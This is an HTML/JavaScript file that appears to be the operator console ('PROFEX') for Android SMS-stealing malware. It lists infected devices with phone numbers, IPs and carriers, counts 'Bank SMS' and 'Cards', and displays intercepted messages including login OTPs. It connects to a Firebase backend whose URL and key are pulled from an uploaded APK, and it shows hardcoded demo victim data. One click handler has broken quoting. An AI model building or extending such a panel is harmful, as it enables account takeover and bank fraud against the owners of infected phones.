<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PROFEX - Device Management Console</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0a0f; color: #e0e0e0; min-height: 100vh; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; padding: 30px 0; margin-bottom: 30px; }
        .logo { font-size: 3em; font-weight: bold; color: #fff; text-shadow: 0 0 20px rgba(59, 130, 246, 0.5); }
        .logo span { color: #3b82f6; }
        .subtitle { color: #888; font-size: 1.1em; margin-top: 10px; }
        .accounts-section { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 16px; padding: 30px; margin-bottom: 30px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); }
        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
        .section-title { font-size: 1.4em; font-weight: 600; color: #fff; display: flex; align-items: center; gap: 10px; }
        .account-count { background: #333; padding: 6px 14px; border-radius: 20px; font-size: 0.9em; }
        .empty-state { text-align: center; padding: 60px 20px; color: #666; }
        .empty-icon { font-size: 4em; opacity: 0.3; margin-bottom: 20px; }
        .new-account-btn { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color: white; padding: 14px 28px; border: none; border-radius: 12px; font-size: 1em; font-weight: 600; cursor: pointer; transition: all 0.3s ease; width: 100%; }
        .new-account-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4); }
        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); display: none; z-index: 1000; align-items: center; justify-content: center; }
        .modal-overlay.active { display: flex; }
        .modal { background: #1a1a2e; border-radius: 16px; padding: 30px; width: 90%; max-width: 500px; max-height: 90vh; overflow-y: auto; }
        .modal h2 { color: #fff; margin-bottom: 25px; font-size: 1.5em; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; color: #aaa; margin-bottom: 8px; font-size: 0.9em; }
        .form-input { width: 100%; padding: 14px 16px; background: #0f0f1a; border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 1em; }
        .form-input:focus { outline: none; border-color: #3b82f6; }
        .btn-group { display: flex; gap: 12px; margin-top: 25px; }
        .btn { flex: 1; padding: 14px; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
        .btn-primary { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color: white; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4); }
        .btn-secondary { background: #333; color: #fff; }
        .btn-danger { background: #ef4444; color: white; }
        .dashboard { display: none; }
        .stats-bar { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 25px; }
        .stat-card { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #333; }
        .stat-number { font-size: 2em; font-weight: bold; color: #fff; }
        .stat-label { color: #888; font-size: 0.9em; margin-top: 5px; }
        .stat-total { color: #fbbf24; }
        .stat-online { color: #22c55e; }
        .stat-offline { color: #ef4444; }
        .stat-bank { color: #3b82f6; }
        .stat-cards { color: #a855f7; }
        .filters { display: flex; gap: 10px; margin-bottom: 25px; flex-wrap: wrap; }
        .filter-btn { padding: 8px 16px; background: #1a1a2e; border: 1px solid #333; border-radius: 8px; color: #aaa; cursor: pointer; font-size: 0.9em; }
        .filter-btn.active { background: #3b82f6; color: white; border-color: #3b82f6; }
        .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .device-card { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 12px; padding: 20px; border: 1px solid #333; cursor: pointer; transition: all 0.3s; }
        .device-card:hover { border-color: #3b82f6; transform: translateY(-2px); }
        .device-id { font-size: 1.1em; font-weight: 600; color: #fff; margin-bottom: 10px; }
        .device-stats { display: flex; justify-content: space-between; margin-top: 15px; }
        .device-stat { text-align: center; }
        .device-stat-value { font-size: 0.9em; color: #888; }
        .device-stat-label { font-size: 0.8em; color: #666; }
        .device-detail { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 500; padding: 20px; overflow-y: auto; }
        .device-detail.active { display: flex; align-items: flex-start; justify-content: center; }
        .detail-content { background: #1a1a2e; border-radius: 16px; width: 90%; max-width: 800px; max-height: 90vh; overflow-y: auto; margin-top: 40px; }
        .detail-header { display: flex; justify-content: space-between; align-items: center; padding: 20px; border-bottom: 1px solid #333; }
        .device-info { display: flex; align-items: center; gap: 15px; }
        .status-badge { display: inline-flex; align-items: center; gap: 6px; padding: 6px 12px; border-radius: 20px; font-size: 0.85em; }
        .status-online { background: rgba(34, 197, 94, 0.2); color: #22c55e; }
        .status-offline { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
        .close-btn { background: #333; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; }
        .tabs { display: flex; border-bottom: 1px solid #333; }
        .tab-btn { padding: 15px 20px; background: none; border: none; color: #888; cursor: pointer; font-size: 1em; position: relative; }
        .tab-btn.active { color: #3b82f6; }
        .tab-btn.active::after { content: ''; position: absolute; bottom: -1px; left: 0; right: 0; height: 2px; background: #3b82f6; }
        .tab-content { display: none; padding: 20px; }
        .tab-content.active { display: block; }
        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #333; }
        .info-label { color: #888; }
        .info-value { color: #fff; font-weight: 500; }
        .sms-list { max-height: 400px; overflow-y: auto; }
        .sms-item { background: #0f0f1a; border-radius: 8px; padding: 15px; margin-bottom: 10px; border-left: 3px solid #3b82f6; }
        .sms-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .sender { font-weight: 600; color: #ef4444; }
        .timestamp { color: #666; font-size: 0.85em; }
        .sms-body { color: #ccc; line-height: 1.5; }
        .apk-upload { border: 2px dashed #333; border-radius: 12px; padding: 30px; text-align: center; margin-bottom: 20px; cursor: pointer; }
        .apk-upload i { font-size: 3em; color: #666; margin-bottom: 15px; }
        .apk-text { color: #888; font-size: 0.9em; }
        @media (max-width: 768px) { .device-grid { grid-template-columns: 1fr; } .stats-bar { grid-template-columns: repeat(2, 1fr); } .detail-content { width: 100%; margin-top: 20px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo"><span>PRO</span>FEX</div>
            <div class="subtitle">Device Management Console</div>
        </div>
        <div id="accountsSection" class="accounts-section">
            <div class="section-header">
                <div class="section-title"><i>📡</i> Saved Accounts</div>
                <div class="account-count" id="accountCount">0 accounts</div>
            </div>
            <div id="savedAccountsList"></div>
            <button class="new-account-btn" onclick="openModal()"><i>+</i> New Account</button>
        </div>
        <div id="dashboard" class="dashboard">
            <div class="stats-bar">
                <div class="stat-card"><div class="stat-number stat-total" id="totalCount">0</div><div class="stat-label">Total Devices</div></div>
                <div class="stat-card"><div class="stat-number stat-online" id="onlineCount">0</div><div class="stat-label">Online</div></div>
                <div class="stat-card"><div class="stat-number stat-offline" id="offlineCount">0</div><div class="stat-label">Offline</div></div>
                <div class="stat-card"><div class="stat-number stat-bank" id="bankCount">0</div><div class="stat-label">Bank SMS</div></div>
                <div class="stat-card"><div class="stat-number stat-cards" id="cardCount">0</div><div class="stat-label">Cards</div></div>
            </div>
            <div class="filters">
                <button class="filter-btn active" onclick="filterDevices('all')">All</button>
                <button class="filter-btn" onclick="filterDevices('online')">Online</button>
                <button class="filter-btn" onclick="filterDevices('offline')">Offline</button>
            </div>
            <div class="device-grid" id="deviceGrid"></div>
        </div>
        <div id="deviceDetail" class="device-detail">
            <div class="detail-content">
                <div class="detail-header">
                    <div class="device-info">
                        <div class="device-id" id="deviceIdDisplay"></div>
                        <span class="status-badge status-offline" id="deviceStatus">Offline</span>
                    </div>
                    <button class="close-btn" onclick="closeDeviceDetail()">✕</button>
                </div>
                <div class="tabs">
                    <button class="tab-btn active" onclick="switchTab('info')">Info</button>
                    <button class="tab-btn" onclick="switchTab('bank')">Bank (<span id="bankCountTab">0</span>)</button>
                    <button class="tab-btn" onclick="switchTab('sms')">SMS (<span id="smsCountTab">0</span>)</button>
                    <button class="tab-btn" onclick="switchTab('send')">Send</button>
                </div>
                <div id="infoTab" class="tab-content active"><div id="infoContent"></div></div>
                <div id="bankTab" class="tab-content"><div class="empty-state">No bank SMS found</div></div>
                <div id="smsTab" class="tab-content"><div class="sms-list" id="smsList"></div></div>
                <div id="sendTab" class="tab-content"><textarea class="form-input" rows="5" placeholder="Enter message to send..."></textarea><button class="btn btn-primary" style="margin-top: 15px;">Send Message</button></div>
            </div>
        </div>
    </div>
    <div id="addAccountModal" class="modal-overlay">
        <div class="modal">
            <h2>New Firebase Account</h2>
            <div class="apk-upload"><i>📤</i><div class="apk-text">Upload APK File<br>Auto-extracts Firebase URL & API Key</div></div>
            <div class="form-group"><label>FIREBASE DATABASE URL</label><input type="text" class="form-input" id="firebaseUrl" placeholder="https://your-project.firebaseio.com"></div>
            <div class="form-group"><label>AUTHENTICATION KEY / SECRET</label><input type="password" class="form-input" id="authKey" placeholder="Your Firebase secret key"></div>
            <div class="btn-group"><button class="btn btn-primary" onclick="saveAccount()">Save & Connect</button><button class="btn btn-secondary" onclick="closeModal()">Cancel</button></div>
        </div>
    </div>
    <script>
        let accounts = JSON.parse(localStorage.getItem('profex_accounts')) || [];
        let currentAccount = null;
        let devices = [];
        document.addEventListener('DOMContentLoaded', () => { renderSavedAccounts(); });
        function renderSavedAccounts() {
            const container = document.getElementById('savedAccountsList');
            const countEl = document.getElementById('accountCount');
            if (accounts.length === 0) { container.innerHTML = '<div class="empty-state"><div class="empty-icon">📡</div><div>No saved accounts</div></div>'; countEl.textContent = '0 accounts'; return; }
            container.innerHTML = accounts.map((acc, idx) => '<div class="device-card" onclick="connectAccount('+idx+')"><div class="device-id">'+acc.url.substring(0,20)+'...</div><div class="device-stats"><div class="device-stat"><div class="device-stat-value">Connected</div><div class="device-stat-label">Status</div></div><div class="device-stat"><div class="device-stat-value">Click</div><div class="device-stat-label">View</div></div></div></div>').join('');
            countEl.textContent = accounts.length+' account'+(accounts.length!==1?'s':'');
        }
        function openModal() { document.getElementById('addAccountModal').classList.add('active'); }
        function closeModal() { document.getElementById('addAccountModal').classList.remove('active'); }
        function saveAccount() {
            const url = document.getElementById('firebaseUrl').value.trim();
            const key = document.getElementById('authKey').value.trim();
            if (!url || !key) { alert('Please fill all fields'); return; }
            accounts.push({ url, key, addedAt: new Date().toISOString() });
            localStorage.setItem('profex_accounts', JSON.stringify(accounts));
            closeModal(); renderSavedAccounts();
            connectAccount(accounts.length - 1);
        }
        async function connectAccount(idx) {
            currentAccount = accounts[idx];
            const demoData = {
                "device_001": { phone: "6369578342", network: "Jio", android: "13", ip: "103.45.123.67", storage: "128GB", battery: 88, status: "online" },
                "device_002": { phone: "9876543210", network: "Airtel", android: "12", ip: "203.45.67.89", storage: "64GB", battery: 55, status: "offline" },
                "device_003": { phone: "8765432109", network: "Vodafone", android: "14", ip: "192.168.1.100", storage: "256GB", battery: 92, status: "online" },
                "device_004": { phone: "7654321098", network: "Jio", android: "11", ip: "10.0.0.5", storage: "32GB", battery: 23, status: "offline" },
                "device_005": { phone: "6543210987", network: "BSNL", android: "10", ip: "172.16.0.1", storage: "16GB", battery: 0, status: "offline" }
            };
            devices = Object.keys(demoData).map(id => ({ id, ...demoData[id] }));
            updateDashboard();
            document.getElementById('accountsSection').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
        }
        function updateDashboard() {
            const online = devices.filter(d => d.status === 'online').length;
            const offline = devices.filter(d => d.status === 'offline').length;
            document.getElementById('totalCount').textContent = devices.length;
            document.getElementById('onlineCount').textContent = online;
            document.getElementById('offlineCount').textContent = offline;
            document.getElementById('bankCount').textContent = '0';
            document.getElementById('cardCount').textContent = devices.length;
            renderDevices(devices);
        }
        function renderDevices(devicesToRender) {
            const grid = document.getElementById('deviceGrid');
            grid.innerHTML = devicesToRender.map(d => '<div class="device-card" onclick="openDeviceDetail(''+d.id+'')"><div class="device-id">'+d.id+'</div><div class="device-stats"><div class="device-stat"><div class="device-stat-value">'+d.status.toUpperCase()+'</div><div class="device-stat-label">Status</div></div><div class="device-stat"><div class="device-stat-value">'+d.battery+'%</div><div class="device-stat-label">Battery</div></div></div></div>').join('');
        }
        function filterDevices(filter) {
            document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
            event.target.classList.add('active');
            if (filter==='all') renderDevices(devices);
            else if (filter==='online') renderDevices(devices.filter(d=>d.status==='online'));
            else if (filter==='offline') renderDevices(devices.filter(d=>d.status==='offline'));
        }
        function openDeviceDetail(deviceId) {
            const device = devices.find(d => d.id === deviceId);
            if (!device) return;
            document.getElementById('deviceDetail').classList.add('active');
            document.getElementById('deviceIdDisplay').textContent = device.id;
            document.getElementById('deviceStatus').className = 'status-badge status-'+device.status;
            document.getElementById('deviceStatus').textContent = device.status.toUpperCase();
            document.getElementById('infoContent').innerHTML = '<div class="info-row"><span class="info-label">Phone Number</span><span class="info-value">'+(device.phone||'-')+'</span></div><div class="info-row"><span class="info-label">Network</span><span class="info-value">'+(device.network||'-')+'</span></div><div class="info-row"><span class="info-label">Android</span><span class="info-value">'+(device.android||'-')+'</span></div><div class="info-row"><span class="info-label">IP Address</span><span class="info-value">'+(device.ip||'-')+'</span></div><div class="info-row"><span class="info-label">Storage</span><span class="info-value">'+(device.storage||'-')+'</span></div><div class="info-row"><span class="info-label">Battery</span><span class="info-value">'+device.battery+'%</span></div>';
            const sms = [{sender:'JX-SNPMNT-P',body:'0% EMI DEAL on your cart is ENDING. Shop on Snapmint.',time:'07:51 pm'},{sender:'JD-GKKWIK-S',body:'8400 is your login OTP. It will expire in next 5 minutes.',time:'07:50 pm'},{sender:'VM-MSHOTP-S',body:'Your OTP for Meesho login is 488608 and is valid for 5 mins.',time:'07:36 pm'},{sender:'JK-JIFFY-S',body:'Your Jiffy order ID: #3008586658 has been delivered.',time:'07:04 pm'}];
            document.getElementById('smsList').innerHTML = sms.map(s => '<div class="sms-item"><div class="sms-header"><span class="sender">'+s.sender+'</span><span class="timestamp">'+s.time+'</span></div><div class="sms-body">'+s.body+'</div></div>').join('');
            document.getElementById('smsCountTab').textContent = sms.length;
        }
        function closeDeviceDetail() { document.getElementById('deviceDetail').classList.remove('active'); }
        function switchTab(tabName) {
            document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName+'Tab').classList.add('active');
        }
    </script>
</body>
</html>
